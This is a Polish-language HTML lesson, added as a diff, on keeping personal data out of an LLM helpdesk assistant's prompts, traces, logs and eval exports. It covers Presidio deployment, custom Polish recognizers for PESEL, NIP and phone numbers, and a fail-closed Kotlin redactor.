@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2.7 Dane osobowe: Presidio – AI na produkcji</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body data-root="../" data-lesson="2.7">
+<main>
+<p class="meta">Lekcja 2.7 · ok. 65 min</p>
+<h1>Dane osobowe: Presidio</h1>
+<div class="box goals"><span class="label">Cele</span><ul>
+  <li>Zrozumieć błąd #5: dane osobowe u dostawcy LLM, w logach, trace'ach i evalach.</li>
+  <li>Narysować mapę przepływu danych osobowych w asystencie.</li>
+  <li>Uruchomić Presidio po polsku z własnymi recognizerami (PESEL, NIP, telefon, allow-lista HD-xxxx).</li>
+  <li>Zbudować <code>PresidioPiiRedactor</code>: timeouty, circuit breaker, fail closed.</li>
+  <li>Wpiąć pseudonimizację w advisor, narzędzia, streaming, trace i eksport do evali.</li>
+  <li>Mierzyć precision/recall i koszt redakcji.</li>
+</ul></div>
+
+<h2>Błąd produkcyjny #5: dane osobowe tam, gdzie nie powinny trafić</h2>
+<p>Dotąd zajmowaliśmy się tym, <em>co</em> widzi użytkownik asystenta (np. izolacja w 2.2). Ta lekcja dotyczy tego, <em>gdzie jeszcze</em> trafiają dane, które przez niego przepływają. <dfn data-t="pii">Dane osobowe</dfn> (imiona i nazwiska, e-maile, telefony, PESEL, numery kont, adresy) są w HelpDesk wszędzie: w zgłoszeniach, komentarzach i wiadomościach czatu.</p>
+<div class="box bug"><span class="label">Incydent (fikcyjny, złożony z typowych przypadków)</span>
+<p>Trzeci tydzień pilota u Acme. Klientka pisze w czacie: „Proszę o korektę faktury, moje dane: Zofia Wiśniewska, PESEL 92031501232, konto PL61 1090 1014 0000 0712 1981 2874, tel. 601 000 111”. Asystent odpowiada sensownie. Co się stało z wiadomością?</p>
+<ol>
+  <li>Trafiła w całości do zewnętrznego dostawcy. Acme ma <code>external_llm_allowed = true</code> i umowę powierzenia, ale nikt nie zapytał, czy model <em>potrzebuje</em> PESEL-u do korekty faktury.</li>
+  <li>Zespół włączył <code>helpdesk.observability.capture-content</code> (1.4) i treść trafiła do chmurowego Langfuse założonego „na próbę”, bez umowy powierzenia. Regex w Collectorze złapał PESEL, ale nie nazwisko ani konto ze spacjami.</li>
+  <li><code>searchTickets(query = "Wiśniewska korekta")</code> zapisało argumenty w spanie, który trafił do Jaegera dostępnego dla całego IT.</li>
+  <li>Po dwóch tygodniach ktoś wyeksportował 200 rozmów z Langfuse do <code>cases.yaml</code> (2.8) i zrobił commit do repozytorium, do którego ma dostęp zewnętrzny podwykonawca.</li>
+</ol>
+<p>Wyciek wykrył skaner sekretów w CI. Inspektor ochrony danych musiał w 72 godziny ocenić naruszenie i ustalić, w ilu systemach są kopie. Z Jaegera i historii Gita nie dało się tego zrobić szybko. Model działał poprawnie; zawiodła architektura przepływu danych.</p></div>
+<p>Wniosek: <strong>dane osobowe nie wyciekają jedną dziurą, tylko przez wszystkie kopie naraz</strong>. Każda funkcja obserwowalności, eksport i dostawca to kopia z własnym dostępem i retencją. Obrona: minimalizacja, redakcja w każdym wyjściu, polityka per tenant.</p>
+
+<h2>Mapa przepływu danych osobowych</h2>
+<p>Zanim napiszesz linijkę kodu, narysuj, którędy dane wchodzą do asystenta i dokąd wychodzą. W HelpDesk wygląda to tak:</p>
+<script type="text/x-code" data-lang="plaintext" data-title="przepływ danych osobowych w asystencie">
+  WEJŚCIA                                    WYJŚCIA (kopie danych)
+  1. wiadomość użytkownika ─┐           ┌──► A. dostawca LLM (przez LiteLLM)
+  2. wyniki narzędzi        ├─► PROMPT ─┼──► B. LiteLLM: logi, callbacki
+  3. historia rozmowy (2.5) │ (backend) ├──► C. trace: Jaeger/Tempo, Langfuse
+  4. pliki, wklejone logi ──┘           ├──► D. logi aplikacji
+                                        └──► E. evale, eksporty (repo, dyski)
+</script>
+<table>
+  <tr><th>Miejsce</th><th>Jakie dane osobowe</th><th>Kto ma dostęp, jak długo</th><th>Decyzja w HelpDesk</th></tr>
+  <tr><td>A. Dostawca LLM</td><td>Cały prompt</td><td>Dostawca, zwykle do 30 dni, chyba że <dfn data-t="zdr">ZDR</dfn></td><td>Redakcja, gdy <code>route.external</code></td></tr>
+  <tr><td>B. LiteLLM</td><td>Prompt i odpowiedź, jeśli logowanie treści włączone</td><td>Zespół platformy</td><td><code>turn_off_message_logging: true</code> (1.4)</td></tr>
+  <tr><td>C. Trace</td><td>Treść, argumenty i wyniki narzędzi</td><td>APM szeroko, Langfuse wąsko</td><td>APM bez treści; Langfuse po redakcji i zgodzie tenanta</td></tr>
+  <tr><td>D. Logi</td><td>Co ktoś zaloguje „na chwilę”</td><td>Szeroko, długo</td><td>Zakaz treści + maskowanie wzorców</td></tr>
+  <tr><td>E. Evale</td><td>Prawdziwe rozmowy</td><td>Repozytorium, CI, podwykonawcy</td><td>Redakcja nieodwracalna + przegląd</td></tr>
+</table>
+<p>Najwięcej danych osobowych przychodzi z <dfn data-t="tool-calling">narzędzi</dfn>, nie od użytkownika. „Streść HD-1042” nie zawiera żadnych, a wynik <code>listComments</code> może mieć kilkanaście: podpisy, telefony, e-maile w stopkach.</p>
+
+<h2>Podstawy prawne w skrócie</h2>
+<p>To nie jest porada prawna, tylko słownictwo do rozmowy z <dfn data-t="iod">Inspektorem Ochrony Danych (IOD)</dfn>, osobą nadzorującą w firmie zgodność z RODO. Decyzje o dostawcach i retencji podejmujesz razem z nim.</p>
+<table>
+  <tr><th>Pojęcie (RODO)</th><th>Co znaczy dla asystenta</th></tr>
+  <tr><td>Minimalizacja (art. 5 ust. 1 lit. c)</td><td>Tylko dane niezbędne do celu. Do korekty faktury model nie potrzebuje PESEL-u ani numeru konta.</td></tr>
+  <tr><td>Powierzenie (art. 28)</td><td>Dostawca LLM, chmurowy Langfuse, hosting logów przetwarzają dane w Twoim imieniu: potrzebna <dfn data-t="dpa">umowa powierzenia (DPA)</dfn>, często też zgoda tenanta na podprzetwarzającego.</td></tr>
+  <tr><td>Przekazanie poza EOG (rozdz. V)</td><td>Model poza Unią wymaga podstawy przekazania (np. standardowe klauzule umowne). Stąd <dfn data-t="data-residency">region przetwarzania</dfn> z 1.6.</td></tr>
+  <tr><td>Pseudonimizacja (art. 4 pkt 5)</td><td>Dane zamienione na znaczniki <strong>nadal są danymi osobowymi</strong>. Ryzyko maleje, obowiązki zostają.</td></tr>
+  <tr><td>Kategorie szczególne (art. 9)</td><td>Zdrowie („na L4 po operacji”) wymaga szczególnej ochrony. Presidio tego nie rozpozna: to treść, nie wzorzec.</td></tr>
+  <tr><td>Naruszenie (art. 33)</td><td>Zgłoszenie do organu w 72 h, chyba że ryzyko jest mało prawdopodobne. Każda niekontrolowana kopia utrudnia ocenę.</td></tr>
+</table>
+<p><dfn data-t="pseudonymization">Pseudonimizacja</dfn> to zamiana danych na znaczniki odwracalna dla tego, kto ma mapowanie („Zofia Wiśniewska” → <code>&lt;PERSON_1&gt;</code>, mapowanie zna tylko backend). <dfn data-t="anonymization">Anonimizacja</dfn> jest nieodwracalna: nikt nie zidentyfikuje osoby, także z pomocą innych danych. W tekście swobodnym to bardzo trudne: „klientka z księgowości Acme, która w marcu zgłaszała problem z SSO” wskazuje osobę bez nazwiska. Dlatego mówimy o redakcji i pseudonimizacji, nie obiecujemy anonimowości.</p>
+<div class="box warn"><span class="label">NIP i dane firm</span><p>NIP spółki nie jest daną osobową, NIP jednoosobowej działalności już tak. Po wzorcu ich nie odróżnisz, więc NIP w treści swobodnej redagujemy zawsze.</p></div>
+
+<h2>Strategia: co redagować, gdzie i dla kogo</h2>
+<p>Redakcja kosztuje milisekundy, psuje część odpowiedzi (model nie wie, że <code>&lt;PERSON_2&gt;</code> to kobieta) i daje złudne poczucie bezpieczeństwa. Decyzja zależy od celu i trasy z <code>ModelRouter</code> (1.6):</p>
+<table>
+  <tr><th>Cel</th><th>Trasa zewnętrzna (Acme, <code>helpdesk-default</code>)</th><th>Trasa lokalna (Globex, <code>helpdesk-local</code>)</th></tr>
+  <tr><td>Prompt do modelu</td><td>Pseudonimizacja odwracalna, <strong>obowiązkowa</strong>, fail closed</td><td>Domyślnie bez redakcji (dane zostają u nas, a redakcja szkodzi słabszemu modelowi); opcjonalnie per tenant</td></tr>
+  <tr><td>Odpowiedź</td><td>Odtworzenie wybranych typów w backendzie</td><td>–</td></tr>
+  <tr><td>Trace (Langfuse)</td><td>Już zredagowana, po zgodzie tenanta</td><td>Nic do usług zewnętrznych; lokalnie redakcja nieodwracalna</td></tr>
+  <tr><td>Logi / evale</td><td colspan="2">Logi: nigdy treść. Evale: redakcja nieodwracalna + przegląd przed commitem</td></tr>
+</table>
+<p>Czat z narzędziami dla Globexu jest wyłączony (<code>ModelRoute.Disabled("EXTERNAL_LLM_NOT_ALLOWED")</code>), więc kolumna „lokalna” dotyczy dziś <code>SUMMARY</code>, <code>TRIAGE</code> i <code>EXTRACTION</code>; gdy po evalach (2.8) dodasz <code>local: helpdesk-local</code> do <code>CHAT</code>, polityka będzie gotowa. Klient, który chce redakcji także dla modelu lokalnego, trafia na listę <code>always-redact-tenants</code>.</p>
+<div class="box tip"><span class="label">Minimalizacja przed redakcją</span><p>Najtańsze dane do zredagowania to te, których nie pobrałeś. Widoki narzędzi z 2.1 zwracają <code>assigneeName</code>, a nie e-mail agenta. Redakcja jest potrzebna dla treści swobodnej, nie dla pól, które możesz pominąć.</p></div>
+
+<h2>Presidio: analyzer i anonymizer</h2>
+<p><dfn data-t="presidio">Presidio</dfn> to otwarte narzędzie do wykrywania i usuwania danych osobowych z tekstu, zapoczątkowane przez Microsoft. To dwie usługi HTTP: <strong>analyzer</strong> zwraca listę znalezisk (typ, początek, koniec, score od 0 do 1) i niczego nie zmienia, a <strong>anonymizer</strong> dostaje tekst ze znaleziskami i stosuje operatory (zamiana, maska, hash, szyfrowanie). Analyzer składa się z <dfn data-t="recognizer">recognizerów</dfn>, czyli niezależnych detektorów typów encji:</p>
+<table>
+  <tr><th>Rodzaj</th><th>Jak działa</th><th>Dobry do</th><th>Słabość</th></tr>
+  <tr><td>NER (spaCy, transformers)</td><td>Model <dfn data-t="ner">NER</dfn> (rozpoznawania nazwanych encji) oznacza osoby, miejsca, organizacje z kontekstu zdania</td><td>Imiona i nazwiska</td><td>Zależny od języka; myli produkty z nazwiskami</td></tr>
+  <tr><td>Wzorce z walidacją</td><td>Regex + funkcja walidująca (suma kontrolna)</td><td>PESEL, NIP, IBAN, e-mail</td><td>Bez walidacji każde 11 cyfr to „PESEL”</td></tr>
+  <tr><td>Deny list</td><td>Dokładne dopasowanie słów z listy</td><td>Znane nazwy (projekty pod NDA)</td><td>Lista do utrzymania</td></tr>
+</table>
+<p>Ważne są <strong>słowa kontekstowe</strong>. Wzorzec NIP-u ma niski score, bo dziesięć cyfr to też numer zamówienia; słowo „NIP” albo „podatkowy” w pobliżu podnosi pewność ponad próg (<code>score_threshold</code>). Dlatego „NIP 123-456-32-18” zostanie zredagowany, a „zamówienie 1234563218” nie.</p>
+<p>Operatory anonymizera (nazwy z dokumentacji Presidio):</p>
+<table>
+  <tr><th>Operator</th><th>Efekt</th><th>Odwracalny?</th><th>Zastosowanie w HelpDesk</th></tr>
+  <tr><td><code>replace</code></td><td>Stała wartość, domyślnie <code>&lt;TYP_ENCJI&gt;</code></td><td>Nie</td><td>Logi, evale</td></tr>
+  <tr><td><code>redact</code></td><td>Usunięcie fragmentu</td><td>Nie</td><td>Rzadko: tekst traci sens</td></tr>
+  <tr><td><code>mask</code></td><td>Część znaków, np. <code>601 *** ***</code></td><td>Nie</td><td>UI dla ról z ograniczonym wglądem</td></tr>
+  <tr><td><code>hash</code></td><td>SHA-256/512; w nowszych wersjach losowa sól per encja, chyba że podasz stałą (min. 16 bajtów)</td><td>Nie</td><td>Analityka „ile różnych osób”</td></tr>
+  <tr><td><code>encrypt</code></td><td>AES z kluczem (<code>decrypt</code> w <code>/deanonymize</code>)</td><td>Tak</td><td>Rzadko; lepsze mapowanie w backendzie</td></tr>
+  <tr><td><code>keep</code></td><td>Bez zmian, ale ze znaleziskiem</td><td>–</td><td>Audyt: co by zredagowano</td></tr>
+</table>
+<p>Do promptu potrzebujemy znaczników numerowanych i spójnych (<code>&lt;PERSON_1&gt;</code>, <code>&lt;PERSON_2&gt;</code>) z mapowaniem w backendzie. Operator <code>custom</code> z funkcją działa tylko w bibliotece Pythona, nie przez REST. Dlatego dla promptu wołamy tylko <strong>analyzer</strong>, a znaczniki wstawiamy w Kotlinie. Anonymizer służy do redakcji nieodwracalnej: eksport do evali, lokalne trace'y.</p>
+
+<h2>Uruchomienie: docker-compose i API REST</h2>
+<div class="box warn"><span class="label">Rejestr obrazów się zmienił</span><p>Starsze materiały podają <code>mcr.microsoft.com/presidio-analyzer</code> i <code>…/presidio-anonymizer</code>. Według aktualnej dokumentacji nowe wydania trafiają do <code>ghcr.io/data-privacy-stack/presidio-*</code>, a obrazy w MCR nie są aktualizowane. Sprawdź to przed wdrożeniem i przypinaj konkretny tag.</p></div>
+<p>Obie usługi nasłuchują w kontenerze na porcie 3000; zalecane mapowanie to 5002 (analyzer) i 5001 (anonymizer). Domyślny obraz analyzera ma tylko model angielski, więc dla polskiego budujemy własny (dwie następne sekcje):</p>
+<script type="text/x-code" data-lang="yaml" data-title="docker-compose.yml (fragment)">
+  services:
+    presidio-analyzer:
+      build: ./presidio                      # polski model + recognizery HelpDesk
+      image: helpdesk/presidio-analyzer-pl:local
+      environment: { WORKERS: 2 }            # każdy worker gunicorna ładuje model do RAM
+      ports: ["5002:3000"]
+      healthcheck:                           # python-slim, bez curla
+        test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:3000/health')"]
+        start_period: 60s                    # ładowanie modelu
+      deploy: { resources: { limits: { memory: 2g } } }
+
+    presidio-anonymizer:
+      image: ghcr.io/data-privacy-stack/presidio-anonymizer:${PRESIDIO_TAG}   # przypięta wersja
+      ports: ["5001:3000"]
+</script>
+<p>Analyzer: <code>POST /analyze</code> z wymaganymi <code>text</code> i <code>language</code> oraz opcjonalnymi <code>entities</code>, <code>score_threshold</code>, <code>allow_list</code>, <code>allow_list_match</code>, <code>correlation_id</code>. Pomocnicze: <code>GET /health</code>, <code>/recognizers?language=pl</code>, <code>/supportedentities?language=pl</code>.</p>
+<script type="text/x-code" data-lang="bash" data-title="test analyzera i anonymizera">
+  curl -s localhost:5002/analyze -H 'Content-Type: application/json' -d '{
+    "text": "Dzwoniła Zofia Wiśniewska, tel. 601 000 111, PESEL 92031501232, dot. HD-1042",
+    "language": "pl",
+    "entities": ["PERSON", "PHONE_NUMBER", "PL_PESEL"],
+    "score_threshold": 0.5,
+    "allow_list": ["HD-\\d{3,6}"],
+    "allow_list_match": "regex"
+  }'
+  # [{"entity_type":"PERSON","start":9,"end":25,"score":0.85},
+  #  {"entity_type":"PHONE_NUMBER","start":32,"end":43,"score":0.75}, ...]
+</script>
+<p>Anonymizer (<code>POST /anonymize</code>) dostaje <code>text</code>, <code>analyzer_results</code> (lista znalezisk z analyzera) i <code>anonymizers</code>, czyli operator per typ encji, np. <code>{"PHONE_NUMBER": {"type": "mask", "masking_char": "*", "chars_to_mask": 7, "from_end": true}}</code>. Score w przykładzie są ilustracyjne. Zawsze przekazuj jawną listę <code>entities</code>. Domyślnie analyzer szuka wszystkiego, co zna, w tym <code>DATE_TIME</code>, <code>URL</code> i <code>UUID</code>. Zredagowanie dat zepsuje pytania o SLA, a zredagowanie UUID sprawi, że model nie przekaże ID zgłoszenia do narzędzia.</p>
+
+<h2>Język polski: model spaCy i jego ograniczenia</h2>
+<p>Domyślny silnik NER to <strong>spaCy</strong>, biblioteka Pythona do przetwarzania języka. Dla polskiego są modele <code>pl_core_news_sm</code>, <code>_md</code> i <code>_lg</code>; <code>_md</code> 3.8 zajmuje ok. 47 MB i według metadanych ma F1 dla encji ok. 0,83. Etykiety pochodzą z Narodowego Korpusu Języka Polskiego: <code>persName</code>, <code>placeName</code>, <code>geogName</code>, <code>orgName</code>, <code>date</code>, <code>time</code>. Mapujemy je na typy Presidio:</p>
+<script type="text/x-code" data-lang="yaml" data-title="presidio/conf/nlp-pl.yaml">
+  nlp_engine_name: spacy
+  models:
+    - lang_code: pl
+      model_name: pl_core_news_md
+  ner_model_configuration:
+    model_to_presidio_entity_mapping:
+      persName: PERSON
+      placeName: LOCATION
+      geogName: LOCATION
+      orgName: ORGANIZATION
+    labels_to_ignore: [date, time]          # daty potrzebne do pytań o SLA
+    low_confidence_score_multiplier: 0.4
+    low_score_entity_names: [ORGANIZATION]
+</script>
+<script type="text/x-code" data-lang="yaml" data-title="presidio/conf/analyzer-pl.yaml">
+  supported_languages: [pl]
+  default_score_threshold: 0.4
+</script>
+<p>Analyzer czyta pliki ze zmiennych <code>NLP_CONF_FILE</code>, <code>ANALYZER_CONF_FILE</code> i <code>RECOGNIZER_REGISTRY_CONF_FILE</code>; ustawiamy wszystkie trzy, żeby nie zostały domyślne (angielskie). Rejestr recognizerów:</p>
+<script type="text/x-code" data-lang="yaml" data-title="presidio/conf/recognizers-pl.yaml">
+  supported_languages: [pl]
+  global_regex_flags: 26                     # IGNORECASE | MULTILINE | DOTALL
+  recognizers:
+    - name: SpacyRecognizer                  # NER z modelu pl_core_news_md
+      type: predefined
+      supported_languages: [pl]
+    - name: EmailRecognizer
+      type: predefined
+      supported_languages:
+        - language: pl
+          context: [email, e-mail, mail, adres, kontakt]
+    - name: IbanRecognizer                   # wbudowana walidacja mod 97, obsługuje PL
+      type: predefined
+      supported_languages:
+        - language: pl
+          context: [konto, rachunek, iban, przelew, nr konta]
+    - name: pl_postal_address                # własny wzorzec bez kodu Pythona
+      type: custom
+      supported_entity: PL_ADDRESS
+      supported_languages:
+        - language: pl
+          context: [adres, zamieszkania, ul, ulica]
+      patterns:
+        - name: ulica z numerem
+          regex: "\\b(ul\\.|ulica|al\\.|os\\.)\\s+[A-ZŁŚŻŹĆ][\\wąćęłńóśźż.-]+(\\s+[\\wąćęłńóśźż.-]+){0,3}\\s+\\d+[a-zA-Z]?(/\\d+)?"
+          score: 0.6
+</script>
+<p>Nazwy recognizerów i format pliku sprawdź w <code>default_recognizers.yaml</code> swojej wersji. Wbudowany jest też <code>PlPeselRecognizer</code> (wzorzec + suma kontrolna + słowo „PESEL”). Recognizery z walidacją w Pythonie dokładamy w następnej sekcji.</p>
+<div class="box warn"><span class="label">Ograniczenia polskiego NER</span><ul>
+  <li><strong>Fleksja.</strong> „Zofia Wiśniewska” i „Zofii Wiśniewskiej” to różne ciągi, więc dostaną różne znaczniki, a model zobaczy dwie osoby.</li>
+  <li><strong>Nazwiska-słowa i produkty.</strong> Kowal, Wilk, Zima raz są osobą, raz nie; nazwy produktów bywają brane za nazwiska.</li>
+  <li><strong>Tekst nieformalny.</strong> „zadzwon do kasi nowak” (bez wielkich liter i polskich znaków) model wykrywa wyraźnie gorzej.</li>
+  <li><strong>Licencja.</strong> Polskie modele spaCy mają licencję GNU GPL 3.0. Użycie wewnętrzne zwykle nie jest problemem, dystrybucja obrazu klientom może być. Zapytaj dział prawny.</li>
+</ul></div>
+
+<h2>Własne recognizery w Pythonie</h2>
+<p>Recognizer wzorcowy to podklasa <code>PatternRecognizer</code>. Wynik <code>validate_result</code>: <code>True</code> podnosi score do maksimum, <code>False</code> odrzuca znalezisko, <code>None</code> zostawia score wzorca (decyduje kontekst i próg).</p>
+<script type="text/x-code" data-lang="python" data-title="presidio/helpdesk_recognizers.py">
+  import re
+  from datetime import date
+  from typing import List, Optional
+
+  from presidio_analyzer import EntityRecognizer, Pattern, PatternRecognizer
+  from presidio_analyzer.predefined_recognizers import PhoneRecognizer
+
+
+  class PlPeselStrictRecognizer(PatternRecognizer):
+      """PESEL: suma kontrolna + poprawna data urodzenia z kodowaniem stulecia w miesiącu."""
+
+      WEIGHTS = (1, 3, 7, 9, 1, 3, 7, 9, 1, 3)
+      CENTURY = {0: 1900, 20: 2000, 40: 2100, 60: 2200, 80: 1800}
+
+      def __init__(self):
+          super().__init__(
+              supported_entity="PL_PESEL",
+              name="PlPeselStrictRecognizer",
+              supported_language="pl",
+              patterns=[Pattern("PESEL", r"\b\d{11}\b", 0.3)],
+              context=["pesel", "peselu", "nr pesel", "numer pesel", "identyfikacyjny"],
+          )
+
+      def validate_result(self, pattern_text: str) -> Optional[bool]:
+          d = [int(c) for c in pattern_text]
+          check = (10 - sum(w * x for w, x in zip(self.WEIGHTS, d)) % 10) % 10
+          if check != d[10]:
+              return False
+          yy, mm, dd = int(pattern_text[0:2]), int(pattern_text[2:4]), int(pattern_text[4:6])
+          offset = (mm // 20) * 20                      # 01–12: 1900, 21–32: 2000, 81–92: 1800
+          try:
+              date(self.CENTURY[offset] + yy, mm - offset, dd)
+          except (KeyError, ValueError):                # np. 31 lutego
+              return False
+          return True
+
+
+  class PlNipRecognizer(PatternRecognizer):
+      """Suma kontrolna nie podnosi pewności – spełnia ją ok. 1 na 11 losowych liczb."""
+
+      WEIGHTS = (6, 5, 7, 2, 3, 4, 5, 6, 7)
+
+      def __init__(self):
+          super().__init__(
+              supported_entity="PL_NIP",
+              name="PlNipRecognizer",
+              supported_language="pl",
+              patterns=[
+                  Pattern("NIP ciągły", r"\b\d{10}\b", 0.1),
+                  Pattern("NIP z kreskami", r"\b\d{3}-\d{3}-\d{2}-\d{2}\b|\b\d{3}-\d{2}-\d{2}-\d{3}\b", 0.3),
+              ],
+              context=["nip", "nipu", "podatkowy", "vat", "nip-u"],
+          )
+
+      def validate_result(self, pattern_text: str) -> Optional[bool]:
+          d = [int(c) for c in re.sub(r"\D", "", pattern_text)]
+          if len(d) != 10:
+              return False
+          c = sum(w * x for w, x in zip(self.WEIGHTS, d)) % 11
+          return None if c != 10 and c == d[9] else False   # None = zostaw score, decyduje kontekst
+
+
+  def build_recognizers() -> List[EntityRecognizer]:
+      return [
+          PlPeselStrictRecognizer(),
+          PlNipRecognizer(),
+          # domyślne regiony PhoneRecognizer nie obejmują PL – „601 000 111” bez +48 by przeszedł
+          PhoneRecognizer(
+              supported_language="pl",
+              supported_regions=("PL",),
+              context=["tel", "telefon", "komórka", "kom", "numer", "dzwonić", "zadzwonić", "sms"],
+          ),
+      ]
+</script>
+<p>Obraz analyzera tworzy silnik w klasie <code>Server</code> (<code>app.py</code>) i startuje go przez gunicorn (<code>app:create_app()</code>). Własne recognizery dodaje cienka nakładka:</p>
+<script type="text/x-code" data-lang="python" data-title="presidio/pl_app.py">
+  # Struktura app.py (Server, engine, create_app) – sprawdzaj przy aktualizacji obrazu
+  from app import Server
+  from helpdesk_recognizers import build_recognizers
+
+
+  def create_app():
+      server = Server()
+      for recognizer in build_recognizers():
+          server.engine.registry.add_recognizer(recognizer)
+      return server.app
+</script>
+<script type="text/x-code" data-lang="plaintext" data-title="presidio/Dockerfile">
+  ARG PRESIDIO_TAG
+  FROM ghcr.io/data-privacy-stack/presidio-analyzer:${PRESIDIO_TAG}
+
+  USER root
+  RUN python -m spacy download pl_core_news_md      # wersja zgodna ze spaCy w obrazie
+  COPY conf/ /app/helpdesk_conf/
+  COPY helpdesk_recognizers.py pl_app.py /app/
+  USER 1001
+
+  ENV NLP_CONF_FILE=/app/helpdesk_conf/nlp-pl.yaml \
+      ANALYZER_CONF_FILE=/app/helpdesk_conf/analyzer-pl.yaml \
+      RECOGNIZER_REGISTRY_CONF_FILE=/app/helpdesk_conf/recognizers-pl.yaml
+  CMD ["sh", "-c", "exec gunicorn -w \"$WORKERS\" -b \"0.0.0.0:$PORT\" \"pl_app:create_app()\""]
+</script>
+<p>Wbudowany i nasz recognizer PESEL-u mogą zwrócić to samo znalezisko; analyzer usuwa takie duplikaty.</p>
+<h3>Allow-lista: numery zgłoszeń i nazwy produktów</h3>
+<p>Numer <code>HD-1042</code> nie jest daną osobową, a model potrzebuje go do <code>getTicket</code>. Cyfry numeru mogą jednak trafić we wzorzec telefonu, a NER bywa, że uzna <code>HD-2077</code> za organizację. Pole <code>allow_list</code> (z <code>allow_list_match: "regex"</code>) odrzuca znaleziska pasujące do listy; trafiają tam też nazwy produktów mylone z nazwiskami (fikcyjny „Acme Ledger”). Allow-lista porównuje tekst znaleziska, nie otoczenie (czy dopasowanie jest pełne, sprawdź w swojej wersji), więc w Kotlinie dodatkowo odrzucamy znaleziska nachodzące na numer zgłoszenia.</p>
+
+<h2>PresidioPiiRedactor w Kotlinie</h2>
+<p>Kontrakt M2 definiuje interfejs i wynik; dokładamy kontekst redakcji i sesję pseudonimów:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/PiiRedactor.kt">
+  interface PiiRedactor {
+      fun redact(text: String, ctx: RedactionContext): RedactionResult
+  }
+
+  /** text – po redakcji; mapping – znacznik → oryginał (np. "<PERSON_1>" → "Zofia Wiśniewska"). */
+  data class RedactionResult(val text: String, val mapping: Map<String, String>)
+
+  enum class RedactionPurpose { LLM_PROMPT, TOOL_RESULT, OBSERVABILITY, EVAL_EXPORT }
+
+  data class RedactionContext(
+      val tenantId: UUID,
+      val purpose: RedactionPurpose,
+      val pseudonyms: PseudonymSession = PseudonymSession(),   // wspólna w obrębie żądania/rozmowy
+      val correlationId: String? = null,                       // traceId → logi Presidio
+  )
+
+  class PiiRedactionUnavailableException(cause: Throwable) :
+      RuntimeException("Usługa redakcji danych osobowych niedostępna", cause)
+</script>
+<script type="text/x-code" data-lang="yaml" data-title="application.yml (fragment)">
+  helpdesk:
+    pii:
+      analyzer-url: http://localhost:5002
+      anonymizer-url: http://localhost:5001
+      language: pl
+      score-threshold: 0.5
+      connect-timeout: 300ms
+      read-timeout: 1500ms              # kawałek budżetu 55 s z lekcji 1.5
+      max-text-length: 20000            # dłuższe teksty dzielimy albo odrzucamy
+      entities: [PERSON, EMAIL_ADDRESS, PHONE_NUMBER, PL_PESEL, PL_NIP, IBAN_CODE, PL_ADDRESS]
+      allow-list: ["HD-\\d{3,6}", "Acme Ledger", "HelpDesk"]
+      restore-in-answer: [PERSON, EMAIL, PHONE]
+      always-redact-tenants: []         # redakcja także dla modelu lokalnego
+
+  resilience4j.circuitbreaker.instances.presidio:   # osobny breaker: awaria Presidio ≠ awaria LLM
+    sliding-window-size: 20
+    failure-rate-threshold: 50
+    wait-duration-in-open-state: 15s
+    record-exceptions: [org.springframework.web.client.ResourceAccessException,
+                        org.springframework.web.client.HttpServerErrorException]
+</script>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/pii/PresidioPiiRedactor.kt">
+  @Component
+  class PresidioPiiRedactor(
+      builder: RestClient.Builder,                 // wstrzyknięty → obserwacje i traceparent (1.4)
+      private val props: PiiProperties,
+      breakers: CircuitBreakerRegistry,
+      private val meters: MeterRegistry,
+  ) : PiiRedactor {
+
+      private val breaker = breakers.circuitBreaker("presidio")
+      private val ticketNumber = Regex("""HD-\d{3,6}""")
+      private val analyzer = builder.clone()
+          .baseUrl(props.analyzerUrl)
+          .requestFactory(JdkClientHttpRequestFactory(
+              HttpClient.newBuilder().connectTimeout(props.connectTimeout).build()
+          ).apply { setReadTimeout(props.readTimeout) })
+          .build()
+
+      override fun redact(text: String, ctx: RedactionContext): RedactionResult {
+          if (text.isBlank()) return RedactionResult(text, emptyMap())
+          require(text.length <= props.maxTextLength) { "Tekst za długi do redakcji: ${text.length}" }
+
+          val sample = Timer.start(meters)
+          val findings = try {
+              breaker.executeSupplier { analyze(text, ctx.correlationId) }
+          } catch (e: Exception) {                 // timeout, 5xx, otwarty breaker – wszystko to samo
+              meters.counter("helpdesk.pii.failures", "purpose", ctx.purpose.name).increment()
+              throw PiiRedactionUnavailableException(e)
+          } finally {
+              sample.stop(meters.timer("helpdesk.pii.redaction.duration", "purpose", ctx.purpose.name))
+          }
+
+          val protectedRanges = ticketNumber.findAll(text).map { it.range }.toList()
+          val accepted = findings
+              .map { it.toUtf16(text) }
+              .filterNot { f -> protectedRanges.any { r -> f.start <= r.last && f.end > r.first } }
+              .let(::resolveOverlaps)
+
+          val out = StringBuilder(text)
+          for (f in accepted.sortedByDescending { it.start }) {      // od końca: indeksy się nie przesuwają
+              val placeholder = ctx.pseudonyms.placeholderFor(f.type, text.substring(f.start, f.end))
+              out.replace(f.start, f.end, placeholder)
+              meters.counter("helpdesk.pii.redactions", "entity", f.type, "purpose", ctx.purpose.name).increment()
+          }
+          return RedactionResult(out.toString(), ctx.pseudonyms.snapshot())
+      }
+
+      private fun analyze(text: String, correlationId: String?): List<AnalyzerFinding> =
+          analyzer.post().uri("/analyze")
+              .body(mapOf("text" to text, "language" to props.language, "entities" to props.entities,
+                  "score_threshold" to props.scoreThreshold, "allow_list" to props.allowList,
+                  "allow_list_match" to "regex", "correlation_id" to correlationId))
+              .retrieve()
+              .body(object : ParameterizedTypeReference<List<AnalyzerFinding>>() {})
+              .orEmpty()
+
+      /** Nakładające się znaleziska: wygrywa wyższy score, przy remisie dłuższe. */
+      private fun resolveOverlaps(fs: List<Finding>): List<Finding> {
+          val result = mutableListOf<Finding>()
+          for (f in fs.sortedWith(compareByDescending<Finding> { it.score }.thenByDescending { it.end - it.start })) {
+              if (result.none { it.start < f.end && f.start < it.end }) result += f
+          }
+          return result
+      }
+  }
+
+  data class AnalyzerFinding(@JsonProperty("entity_type") val entityType: String,
+                             val start: Int, val end: Int, val score: Double) {
+      /** Presidio liczy pozycje w znakach Unicode (Python), Kotlin w jednostkach UTF-16. */
+      fun toUtf16(text: String) = Finding(placeholderType(entityType),
+          text.offsetByCodePoints(0, start), text.offsetByCodePoints(0, end), score)
+  }
+
+  data class Finding(val type: String, val start: Int, val end: Int, val score: Double)
+
